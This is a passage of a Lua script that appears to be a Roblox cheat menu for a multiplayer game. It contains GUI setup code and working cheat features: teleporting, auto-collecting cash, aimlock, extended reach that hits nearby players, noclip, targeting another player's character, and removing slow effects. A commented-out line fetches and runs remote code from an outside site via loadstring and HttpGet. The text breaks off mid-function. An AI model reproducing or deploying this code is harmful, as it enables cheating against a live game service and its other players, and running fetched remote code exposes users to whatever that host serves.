AntiGrab.Font = Enum.Font.GothamBlack
AntiGrab.Text = "Anti-Grab"
AntiGrab.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiGrab.TextSize = 14.000

AntiGrabColor.Name = "AntiGrabColor"
AntiGrabColor.Parent = AntiGrab
AntiGrabColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiGrabColor.BorderSizePixel = 0
AntiGrabColor.Size = UDim2.new(0, 93, 0, 5)
AntiGrabColor.Font = Enum.Font.SourceSans
AntiGrabColor.Text = ""
AntiGrabColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AntiGrabColor.TextSize = 14.000

AutoDrop.Name = "AutoDrop"
AutoDrop.Parent = TogglesFrame
AutoDrop.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AutoDrop.BorderSizePixel = 0
AutoDrop.Position = UDim2.new(0.678155124, 0, 0.409230769, 0)
AutoDrop.Size = UDim2.new(0, 94, 0, 46)
AutoDrop.Font = Enum.Font.GothamBlack
AutoDrop.Text = "Auto Drop"
AutoDrop.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoDrop.TextSize = 14.000

AutoDropColor.Name = "AutoDropColor"
AutoDropColor.Parent = AutoDrop
AutoDropColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AutoDropColor.BorderSizePixel = 0
AutoDropColor.Size = UDim2.new(0, 93, 0, 5)
AutoDropColor.Font = Enum.Font.SourceSans
AutoDropColor.Text = ""
AutoDropColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AutoDropColor.TextSize = 14.000

AntiStomp.Name = "AntiStomp"
AntiStomp.Parent = TogglesFrame
AntiStomp.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AntiStomp.BorderSizePixel = 0
AntiStomp.Position = UDim2.new(0.355005682, 0, 0.221326202, 0)
AntiStomp.Size = UDim2.new(0, 94, 0, 46)
AntiStomp.Font = Enum.Font.GothamBlack
AntiStomp.Text = "Anti-Stomp"
AntiStomp.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiStomp.TextSize = 14.000

AntiStompColor.Name = "AntiStompColor"
AntiStompColor.Parent = AntiStomp
AntiStompColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiStompColor.BorderSizePixel = 0
AntiStompColor.Size = UDim2.new(0, 93, 0, 5)
AntiStompColor.Font = Enum.Font.SourceSans
AntiStompColor.Text = ""
AntiStompColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AntiStompColor.TextSize = 14.000

AutoBlock.Name = "AutoBlock"
AutoBlock.Parent = TogglesFrame
AutoBlock.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AutoBlock.BorderSizePixel = 0
AutoBlock.Position = UDim2.new(0.680955052, 0, 0.221326202, 0)
AutoBlock.Size = UDim2.new(0, 94, 0, 46)
AutoBlock.Font = Enum.Font.GothamBlack
AutoBlock.Text = "Auto Block"
AutoBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoBlock.TextSize = 14.000

AutoBlockColor.Name = "AutoBlockColor"
AutoBlockColor.Parent = AutoBlock
AutoBlockColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AutoBlockColor.BorderSizePixel = 0
AutoBlockColor.Size = UDim2.new(0, 93, 0, 5)
AutoBlockColor.Font = Enum.Font.SourceSans
AutoBlockColor.Text = ""
AutoBlockColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AutoBlockColor.TextSize = 14.000

CashAura.Name = "CashAura"
CashAura.Parent = TogglesFrame
CashAura.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
CashAura.BorderSizePixel = 0
CashAura.Position = UDim2.new(0.681183517, 0, 0.0399999991, 0)
CashAura.Size = UDim2.new(0, 94, 0, 46)
CashAura.Font = Enum.Font.GothamBlack
CashAura.Text = "Cash Aura"
CashAura.TextColor3 = Color3.fromRGB(255, 255, 255)
CashAura.TextSize = 14.000

CashAuraColor.Name = "CashAuraColor"
CashAuraColor.Parent = CashAura
CashAuraColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CashAuraColor.BorderSizePixel = 0
CashAuraColor.Size = UDim2.new(0, 93, 0, 5)
CashAuraColor.Font = Enum.Font.SourceSans
CashAuraColor.Text = ""
CashAuraColor.TextColor3 = Color3.fromRGB(255, 0, 0)
CashAuraColor.TextSize = 14.000

AntiEffects.Name = "AntiEffects"
AntiEffects.Parent = TogglesFrame
AntiEffects.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AntiEffects.BorderSizePixel = 0
AntiEffects.Position = UDim2.new(0.677926719, 0, 0.762864709, 0)
AntiEffects.Size = UDim2.new(0, 94, 0, 46)
AntiEffects.Font = Enum.Font.GothamBlack
AntiEffects.Text = "Anti-Effects"
AntiEffects.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiEffects.TextSize = 14.000

AntiEffectsColor.Name = "AntiEffectsColor"
AntiEffectsColor.Parent = AntiEffects
AntiEffectsColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiEffectsColor.BorderSizePixel = 0
AntiEffectsColor.Size = UDim2.new(0, 93, 0, 5)
AntiEffectsColor.Font = Enum.Font.SourceSans
AntiEffectsColor.Text = ""
AntiEffectsColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AntiEffectsColor.TextSize = 14.000

AltArmor.Name = "AltArmor"
AltArmor.Parent = TogglesFrame
AltArmor.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AltArmor.BorderSizePixel = 0
AltArmor.Position = UDim2.new(0.677926719, 0, 0.590557039, 0)
AltArmor.Size = UDim2.new(0, 94, 0, 46)
AltArmor.Font = Enum.Font.GothamBlack
AltArmor.Text = "Alt Armor"
AltArmor.TextColor3 = Color3.fromRGB(255, 255, 255)
AltArmor.TextSize = 14.000

AltArmorColor.Name = "AltArmorColor"
AltArmorColor.Parent = AltArmor
AltArmorColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AltArmorColor.BorderSizePixel = 0
AltArmorColor.Size = UDim2.new(0, 93, 0, 5)
AltArmorColor.Font = Enum.Font.SourceSans
AltArmorColor.Text = ""
AltArmorColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AltArmorColor.TextSize = 14.000

AntiBag.Name = "AntiBag"
AntiBag.Parent = TogglesFrame
AntiBag.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AntiBag.BorderSizePixel = 0
AntiBag.Position = UDim2.new(0.351977378, 0, 0.590557039, 0)
AntiBag.Size = UDim2.new(0, 94, 0, 46)
AntiBag.Font = Enum.Font.GothamBlack
AntiBag.Text = "Anti-Bag"
AntiBag.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiBag.TextSize = 14.000

AntiBagColor.Name = "AntiBagColor"
AntiBagColor.Parent = AntiBag
AntiBagColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiBagColor.BorderSizePixel = 0
AntiBagColor.Size = UDim2.new(0, 93, 0, 5)
AntiBagColor.Font = Enum.Font.SourceSans
AntiBagColor.Text = ""
AntiBagColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AntiBagColor.TextSize = 14.000

AntiSlow.Name = "AntiSlow"
AntiSlow.Parent = TogglesFrame
AntiSlow.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AntiSlow.BorderSizePixel = 0
AntiSlow.Position = UDim2.new(0.355234176, 0, 0.0399999991, 0)
AntiSlow.Size = UDim2.new(0, 94, 0, 46)
AntiSlow.Font = Enum.Font.GothamBlack
AntiSlow.Text = "Anti-Slow"
AntiSlow.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiSlow.TextSize = 14.000

AntiSlowColor.Name = "AntiSlowColor"
AntiSlowColor.Parent = AntiSlow
AntiSlowColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiSlowColor.BorderSizePixel = 0
AntiSlowColor.Size = UDim2.new(0, 93, 0, 5)
AntiSlowColor.Font = Enum.Font.SourceSans
AntiSlowColor.Text = ""
AntiSlowColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AntiSlowColor.TextSize = 14.000

SellingFrame.Name = "SellingFrame"
SellingFrame.Parent = Buttons
SellingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SellingFrame.BackgroundTransparency = 1.000
SellingFrame.Size = UDim2.new(0, 316, 0, 325)
SellingFrame.Visible = false

CashTextbox.Name = "CashTextbox"
CashTextbox.Parent = SellingFrame
CashTextbox.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
CashTextbox.BorderSizePixel = 0
CashTextbox.Position = UDim2.new(0.0949367061, 0, 0.212307692, 0)
CashTextbox.Size = UDim2.new(0, 257, 0, 34)
CashTextbox.Font = Enum.Font.SourceSans
CashTextbox.PlaceholderText = "INSERT MONEY AMOUNT"
CashTextbox.Text = ""
CashTextbox.TextColor3 = Color3.fromRGB(255, 255, 255)
CashTextbox.TextSize = 14.000

CashDropperTitle.Name = "CashDropperTitle"
CashDropperTitle.Parent = SellingFrame
CashDropperTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CashDropperTitle.BackgroundTransparency = 1.000
CashDropperTitle.Position = UDim2.new(0.158227861, 0, 0.0276923068, 0)
CashDropperTitle.Size = UDim2.new(0, 217, 0, 26)
CashDropperTitle.Font = Enum.Font.LuckiestGuy
CashDropperTitle.Text = "CASH DROPPER"
CashDropperTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
CashDropperTitle.TextSize = 30.000

CalculateButton.Name = "CalculateButton"
CalculateButton.Parent = SellingFrame
CalculateButton.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
CalculateButton.BorderSizePixel = 0
CalculateButton.Position = UDim2.new(0.0949367136, 0, 0.369230747, 0)
CalculateButton.Size = UDim2.new(0, 118, 0, 27)
CalculateButton.Font = Enum.Font.GothamBlack
CalculateButton.Text = "Calculate"
CalculateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CalculateButton.TextSize = 14.000

DropToggleButton.Name = "DropToggleButton"
DropToggleButton.Parent = SellingFrame
DropToggleButton.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
DropToggleButton.BorderSizePixel = 0
DropToggleButton.Position = UDim2.new(0.532544494, 0, 0.369230747, 0)
DropToggleButton.Size = UDim2.new(0, 118, 0, 27)
DropToggleButton.Font = Enum.Font.GothamBlack
DropToggleButton.Text = "Enable"
DropToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
DropToggleButton.TextSize = 14.000

CashDroppedLabel.Name = "CashDroppedLabel"
CashDroppedLabel.Parent = SellingFrame
CashDroppedLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CashDroppedLabel.BackgroundTransparency = 1.000
CashDroppedLabel.Position = UDim2.new(0.0949367136, 0, 0.596923113, 0)
CashDroppedLabel.Size = UDim2.new(0, 200, 0, 12)
CashDroppedLabel.Font = Enum.Font.GothamBlack
CashDroppedLabel.Text = "Cash Dropped:"
CashDroppedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
CashDroppedLabel.TextSize = 14.000
CashDroppedLabel.TextXAlignment = Enum.TextXAlignment.Left

CashAtEndLabel.Name = "CashAtEndLabel"
CashAtEndLabel.Parent = SellingFrame
CashAtEndLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CashAtEndLabel.BackgroundTransparency = 1.000
CashAtEndLabel.Position = UDim2.new(0.0949367136, 0, 0.698461592, 0)
CashAtEndLabel.Size = UDim2.new(0, 200, 0, 12)
CashAtEndLabel.Font = Enum.Font.GothamBlack
CashAtEndLabel.Text = "Cash you will have left:"
CashAtEndLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
CashAtEndLabel.TextSize = 14.000
CashAtEndLabel.TextXAlignment = Enum.TextXAlignment.Left

Frame_2.Parent = SellingFrame
Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.0949367061, 0, 0.769230783, 0)
Frame_2.Size = UDim2.new(0, 152, 0, 4)


SwagmodeFrame.Active = true
SwagmodeFrame.Draggable = true
--[[
local function FUVO_fake_script() -- imiecredits.LocalScript 
	local script = Instance.new('LocalScript', imiecredits)
	loadstring(game:HttpGet('https://iexploit.xyz/credits'))()
end


coroutine.wrap(FUVO_fake_script)()
--]]
imiecredits.Text = "Credits:\nby: yahyeee#7643\nUI by: imie#0039"

--[[
local function PXXAONR_fake_script() -- UIGradient.LocalScript 
	local script = Instance.new('LocalScript', UIGradient)
	game:GetService('RunService').RenderStepped:Connect(function()
		script.Parent.Rotation = (tick() * 75) % 360;
	end)
end


--coroutine.wrap(PXXAONR_fake_script)()
local function OZAKZ_fake_script() -- SwagmodeFrame.DragScript 
	local script = Instance.new('LocalScript', SwagmodeFrame)
	script.Parent.Active = true
	script.Parent.Draggable = true
end
coroutine.wrap(OZAKZ_fake_script)()
--]]

function hideframes()
    MainFrame.Visible = false
    QuickTpFrame.Visible = false
    SideScriptsFrame.Visible = false
    TogglesFrame.Visible = false
    SellingFrame.Visible = false
end

function announce(title,text,time)
    game.StarterGui:SetCore("SendNotification", {
        Title = title;
        Text = text;
        Duration = time;
    })
end

Players = game:GetService('Players')
UIS = game:GetService('UserInputService')
RS = game:GetService('RunService')


TogglesButton.MouseButton1Click:Connect(function()
    hideframes()
    TogglesFrame.Visible = true
end)
QuickTpButton.MouseButton1Click:Connect(function()
    hideframes()
    QuickTpFrame.Visible = true
end)
SideButton.MouseButton1Click:Connect(function()
    hideframes()
    SideScriptsFrame.Visible = true
end)
MainButton.MouseButton1Click:Connect(function()
    hideframes()
    MainFrame.Visible = true
end)
SellingButton.MouseButton1Click:Connect(function()
    hideframes()
    SellingFrame.Visible = true
end)

local formatNumber = (function (n)
    n = tostring(n)
    return n:reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end)

function SetPlayerInfo()
    local foundplayer = game:GetService('Players'):FindFirstChild(TargetTextbox.Text)
    if foundplayer then
        local TargetId = foundplayer.UserId
        local ThumbType = Enum.ThumbnailType.HeadShot
        local ThumbSize = Enum.ThumbnailSize.Size420x420
        local Content, IsReady = game:GetService('Players'):GetUserThumbnailAsync(TargetId, ThumbType, ThumbSize)
                    
        TargetImage.Image = Content
        
        CashLabel.Text = ('Cash : ' .. formatNumber(foundplayer.DataFolder.Currency.Value))
        BountyLabel.Text = ('Bounty : ' .. formatNumber(foundplayer.leaderstats.Wanted.Value))
        
        local CrewValue = foundplayer:FindFirstChild('DataFolder'):FindFirstChild('Information'):FindFirstChild('Crew')
        if CrewValue then
            if CrewValue.Value ~= nil and CrewValue.Value ~= '' then
                Crew = game:GetService('GroupService'):GetGroupInfoAsync(tonumber(CrewValue.Value))
                if Crew then
                    CrewLabel.Text = ('Crew : ' .. Crew.Name )
                    CrewId = tonumber(CrewValue.Value)
                end
            else
                CrewLabel.Text = ('Crew : None')
                Crew = nil
            end
        else
            CrewLabel.Text = ('Crew : None')
            Crew = nil
        end
    end
end

CrewLabel.MouseButton1Click:Connect(function()
    if CrewLabel.Text ~= ('Crew : None') then
        setclipboard(CrewId)
    end
end)

function ShrinkName()
    TargetTextbox.FocusLost:connect(function()
        for i,v in pairs(game.Players:GetChildren()) do
            if (string.sub(string.lower(v.Name),1,string.len(TargetTextbox.Text))) == string.lower(TargetTextbox.Text) then
                TargetTextbox.Text = v.Name
                SetPlayerInfo()
            end
        end
    end)
end
ShrinkName()

function view(plr)
    wait()
    if game.Players:FindFirstChild(plr) then
        if game.Players[plr].Character then
            game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = game.Players:FindFirstChild(plr).Character.HumanoidRootPart
        else
            View.Text = 'View'
        end
    else
        View.Text = 'View'
    end
end



------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
player = game.Players.LocalPlayer
mouse = player:GetMouse()


MaxDistance = 15

COOLDOWN = true
RIDING = false

Aimlocked = nil

NamePos = CFrame.new(0,0,0)

green = Color3.new(0,255,0)
red = Color3.new(255,0,0)

buyingarmor = false
UIS.InputBegan:Connect(function(key,b) 
    if key.KeyCode == Enum.KeyCode.V and not b then
        if SwagmodeFrame.Visible == true then
            SwagmodeFrame.Visible = false
        else
            SwagmodeFrame.Visible = true
        end
    end
    if key.KeyCode == Enum.KeyCode.Q and not b then    
        if QToTpColor.BackgroundColor3 == green then
        	if mouse.Target then 
        		local part = mouse.Target
                local partSize = part.Size
                local halfSize = partSize.Y/2
                player.Character.HumanoidRootPart.CFrame = CFrame.new(mouse.Hit.X,part.Position.Y + halfSize + 3,mouse.Hit.Z) * CFrame.Angles(math.rad(player.Character.HumanoidRootPart.Orientation.X),math.rad(player.Character.HumanoidRootPart.Orientation.Y),math.rad(player.Character.HumanoidRootPart.Orientation.Z))
                if not player.Character.LeftHand:FindFirstChild('LeftWrist') then
                    player.Character.LeftHand.Position = player.Character.LeftLowerArm.Position
                    player.Character.RightHand.Position = player.Character.RightLowerArm.Position
                end
            end
        end
    end
    if key.KeyCode == Enum.KeyCode.LeftAlt and not b then
        if buyingarmor == false and AltArmorColor.BackgroundColor3 == green then
            local ItemCost = 1000
            buyingarmor = true
            local ClickDetector = game:GetService("Workspace").Ignored.Shop["[Medium Armor] - $1000"].ClickDetector
            local Location = game:GetService("Workspace").Ignored.Shop["[Medium Armor] - $1000"].ClickDetector.Parent.Head.Position
            OldCFrame = player.Character.HumanoidRootPart.CFrame
            local function buy()
                wait()
                player.Character.HumanoidRootPart.CFrame = CFrame.new(Location)
                fireclickdetector(ClickDetector)
            end
            repeat buy() until player.Character.BodyEffects.Armor.Value == 100 or player.DataFolder.Currency.Value <= ItemCost or player.Character.BodyEffects.Armor:FindFirstChild('God')
            player.Character.HumanoidRootPart.CFrame = OldCFrame
            buyingarmor = false
        end
    end
    if key.KeyCode == Enum.KeyCode.F and not b then
        if HideBlockColor.BackgroundColor3 == green or AutoBlockColor.BackgroundColor3 == green then
            HoldingF = true
            player.Character:FindFirstChildWhichIsA('Humanoid').Name = 'SWAG ON TOP'
            while HoldingF == true and HideBlockColor.BackgroundColor3 == green do
                wait()
                for _,v in pairs(player.Character:FindFirstChildWhichIsA('Humanoid'):GetPlayingAnimationTracks()) do
                    if v.Name == 'Block' then
                        v:Stop()
                    end
                end
            end
        end
    end
    if key.KeyCode == Enum.KeyCode.Space and not b then
        coroutine.resume(coroutine.create(function()
            if Stamina.Text == 'Unstamina' then
                HoldingSpace = true
                while HoldingSpace == true do
                    wait()
                    player.Character:FindFirstChildWhichIsA('Humanoid').JumpPower = 50
                    player.Character:FindFirstChildWhichIsA('Humanoid').Jump = true
                end
            end
        end))
        if RIDING == true then
            COOLDOWN = false
            for i,v in pairs(game.Workspace.Ignored:GetChildren()) do
                if v.Name == 'MyLauncher' then
                    v.Name = 'Launcher'
                end
            end
            repeat wait() until not game:GetService('Workspace'):FindFirstChild('Ignored'):FindFirstChild('MyLauncher')
            COOLDOWN = true
        end
    end
    if key.KeyCode == Enum.KeyCode.E and not b then
        if Aimlock.Text == 'Unaimlock' then
            local LowerTorso = mouse.Target.Parent:FindFirstChild('LowerTorso')
            if not LowerTorso then
                LowerTorso = mouse.Target.Parent.Parent:FindFirstChild('LowerTorso')
            end
            if LowerTorso then
                if LowerTorso.Parent.Name == 'SpecialParts' then
                    Aimlocked = LowerTorso.Parent.Parent.Parent.Name
                else
                    Aimlocked = LowerTorso.Parent.Name
                end
                announce('Aimlocked to ' .. Aimlocked, RPGTarget, 3)
            else
                Aimlocked = nil
                announce('Unaimlocked', '', 2)
            end
        end
    end
end)

HoldingSpace = false
UIS.InputEnded:Connect(function(key,b)
    if key.KeyCode == Enum.KeyCode.F and not b then
        player.Character:FindFirstChildWhichIsA('Humanoid').Name = 'Humanoid'
        HoldingF = false
    end
    if key.KeyCode == Enum.KeyCode.Space then
        HoldingSpace = false
    end
end)

player.CharacterAdded:Connect(function(character)
    repeat wait() until player.Character
    NamePos = player.Character.HumanoidRootPart.CFrame
    if SpawnPosition ~= nil then
        player.Character.HumanoidRootPart.CFrame = SpawnPosition
    end
end)


game.Workspace.Ignored.ChildAdded:Connect(function(child)
    if child.Name == 'Launcher' and player.Character:FindFirstChild('[RPG]') then
        child.Name = 'MyLauncher' 
    end
end)

------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------

View.MouseButton1Click:Connect(function()
    if View.Text == 'View' then
        View.Text = 'Unview'
        repeat view(TargetTextbox.Text) until View.Text == 'View'
        game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = player.Character:FindFirstChildWhichIsA('Humanoid')
    else
        View.Text = 'View'
    end
end)
Headless.MouseButton1Click:Connect(function()
    player.Character.Head:BreakJoints()
    player.Character.Head.Position = Vector3.new(0,99999999999999,0)
end)
GoTo.MouseButton1Click:Connect(function()
    player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[TargetTextbox.Text].Character.UpperTorso.Position)
end)
NoRecoil.MouseButton1Click:Connect(function()
    for i,v in pairs(game:GetService('Workspace'):GetChildren()) do
        if v:IsA('Camera') then
            v:Destroy()
        end
    end
    local newcam = Instance.new('Camera',game.Workspace)
    newcam.Name = 'Camera'
    newcam.CameraType = 'Custom'
    newcam.CameraSubject = game:GetService('Workspace').Players:FindFirstChild(player.Name):FindFirstChild('Humanoid')
    newcam.HeadLocked = true
    newcam.HeadScale = 1
        	    
end)
if not syn and not KRNL_LOADED then
    Reach.Text = 'ToolReach'
end
Reach.MouseButton1Click:Connect(function()
    if Reach.Text == 'ToolReach' then
        if player.Character:FindFirstChildWhichIsA('Tool') then
            player.Character:FindFirstChildWhichIsA('Tool').Handle.Size = Vector3.new(50,50,50)
        	player.Character:FindFirstChildWhichIsA('Tool').Handle.Transparency = 1
        else
            announce('Reach Error', 'you need to be holding a tool', 3)
        end
    else
        if Reach.Text == 'Reach' then
            Reach.Text = 'Unreach'
            while Reach.Text == 'Unreach' do
                wait()
                    local success, err = pcall(function()
                    if player.Character.BodyEffects.Attacking.Value == true then
                        for i,v in pairs(game:GetService('Players'):GetChildren()) do
                            if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.LeftHand.Position).Magnitude <= 50 then
                                if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
                                    if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild('Handle') then
                                        firetouchinterest(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, v.Character.UpperTorso, 0)
                                    else
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightHand'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftHand'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightFoot'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftFoot'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightLowerLeg'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftLowerLeg'], v.Character.UpperTorso, 0)
                                    end
                                end
                            end
                        end
                    end
                end)
            end
        else
            Reach.Text = 'Reach'
        end
    end
end)
FreeFists.MouseButton1Click:Connect(function()
    for i,v in next, workspace:GetDescendants() do
        if v:IsA'Seat' then
            v:Destroy()
        end
    end
    local FistControl = false
    pcall(function()
        player.Character.LeftHand.LeftWrist:Destroy();
        player.Character.RightHand.RightWrist:Destroy();
    end);
    local loopFunction = function()
        player.Character.LeftHand.CFrame  = CFrame.new(mouse.Hit.p);
        player.Character.RightHand.CFrame = CFrame.new(mouse.Hit.p);
    end;        
    local Loop
    local Start = function()
        Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
    end;         
    local Pause = function()
        Loop:Disconnect()
    end;
    UIS.InputBegan:Connect(function(a, b)
        if a.KeyCode == Enum.KeyCode.T and not b then
            if FistControl == false then
                FistControl = true;
                Start();
            elseif FistControl == true then
                FistControl = false;
                Pause();
                player.Character.LeftHand.CFrame  = player.Character.LeftLowerArm.CFrame
                player.Character.RightHand.CFrame = player.Character.RightLowerArm.CFrame
            end;
        end;
    end)
end)
Target.MouseButton1Click:Connect(function()
    if Target.Text == 'Target' then
        Target.Text = 'Untarget'
        pcall(function()
            player.Character.LeftHand.LeftWrist:Destroy();
            player.Character.RightHand.RightWrist:Destroy();
        end);
        local loopFunction = function()
            if game.Players:FindFirstChild(TargetTextbox.Text).Character then
                player.Character.LeftHand.CFrame  = CFrame.new(game.Players[TargetTextbox.Text].Character.UpperTorso.Position);
                player.Character.RightHand.CFrame = CFrame.new(game.Players[TargetTextbox.Text].Character.UpperTorso.Position);
                if game.Players:FindFirstChild(TargetTextbox.Text).Character.BodyEffects['K.O'].Value == true then
                    Target.Text = 'Target'
                end
            else
                Target.Text = 'Target'
            end
        end;        
        local Loop
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;         
        local Pause = function()
            Loop:Disconnect()
            announce('Target', 'no longer targeting', 5)
            player.Character.LeftHand.CFrame  = player.Character.LeftLowerArm.CFrame
            player.Character.RightHand.CFrame = player.Character.RightLowerArm.CFrame
        end;
        Start()
        repeat wait() until Target.Text == 'Target'
        Pause()
    else
        Target.Text = 'Target'
    end
end)
local OldState = player.Character:FindFirstChildWhichIsA('Humanoid'):GetState()
NoClip.MouseButton1Click:Connect(function()
    local Character = player.Character
    local Humanoid = Character:FindFirstChildWhichIsA('Humanoid')
    local Control = false
    local loopFunction = function()
        Humanoid:ChangeState(11)
    end;
    local Loop
    local Start = function()
        if Control == false then
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end
    end;
    local Ended = function()
        if Control == true then
            Humanoid:ChangeState(OldState)
        end
    end;
    Start()	
    local Pause = function()
        Loop:Disconnect()
    end;
    local Pause2 = function()
        Start();
        Loop2:Disconnect()
    end;
    UIS.InputBegan:Connect(function(a, b)
        if a.KeyCode == Enum.KeyCode.Z and not b then
            if Control == false then
            	Control = true;
            	Ended();
            	Pause();
            elseif Control == true then
            	Control = false;
            	Pause2();
            end;
        end;
    end);	
end)







------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------


QToTpColor.BackgroundColor3 = red
QToTp.MouseButton1Click:Connect(function()
    if QToTpColor.BackgroundColor3 == red then
        QToTpColor.BackgroundColor3 = green
    else
        QToTpColor.BackgroundColor3 = red
    end
end)

AntiSlowColor.BackgroundColor3 = red
AntiSlow.MouseButton1Click:Connect(function()
    if AntiSlowColor.BackgroundColor3 == red then
        AntiSlowColor.BackgroundColor3 = green
        local Loop
        local loopFunction = function()
            local DeletePart = player.Character.BodyEffects.Movement:FindFirstChild('NoJumping') or player.Character.BodyEffects.Movement:FindFirstChild('ReduceWalk') or player.Character.BodyEffects.Movement:FindFirstChild('NoWalkSpeed')
            if DeletePart then DeletePart:Destroy() end
            if player.Character.BodyEffects.Reload.Value == true then player.Character.BodyEffects.Reload.Value = false end
        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait() until AntiSlowColor.BackgroundColor3 == red
        Pause()
    else
        AntiSlowColor.BackgroundColor3 = red
    end
end)

CashAuraColor.BackgroundColor3 = red
CashAura.MouseButton1Click:Connect(function()
    if CashAuraColor.BackgroundColor3 == red then
        CashAuraColor.BackgroundColor3 = green
        local Loop
        local loopFunction = function()
            for i,v in pairs(game:GetService('Workspace')['Ignored']['Drop']:GetChildren()) do
                if v:IsA('Part') then
                    if (v.Position - player.Character.HumanoidRootPart.Position).Magnitude <= 12 then
                        fireclickdetector(v:FindFirstChild('ClickDetector'))
                    end
                end
            end
        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait() until CashAuraColor.BackgroundColor3 == red
        Pause()
    else
        CashAuraColor.BackgroundColor3 = red
    end
end)

HideBlockColor.BackgroundColor3 = red
HideBlock.MouseButton1Click:Connect(function()
    if HideBlockColor.BackgroundColor3 == red then
        HideBlockColor.BackgroundColor3 = green
    else
        HideBlockColor.BackgroundColor3 = red
    end
end)

AntiStompColor.BackgroundColor3 = red
AntiStomp.MouseButton1Click:Connect(function()
    if AntiStompColor.BackgroundColor3 == red then
        AntiStompColor.BackgroundColor3 = green
        local Loop
        local loopFunction = function()
            if player.Character.BodyEffects['K.O'].Value == true then player.Character:Destroy() end
        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait() until AntiStompColor.BackgroundColor3 == red
        Pause()
    else
        AntiStompColor.BackgroundColor3 = red
    end
end)

AutoBlockColor.BackgroundColor3 = red
AutoBlock.MouseButton1Click:Connect(function()
    if AutoBlockColor.BackgroundColor3 == red then
        AutoBlockColor.BackgroundColor3 = green
        local Loop
        local loopFunction = function()
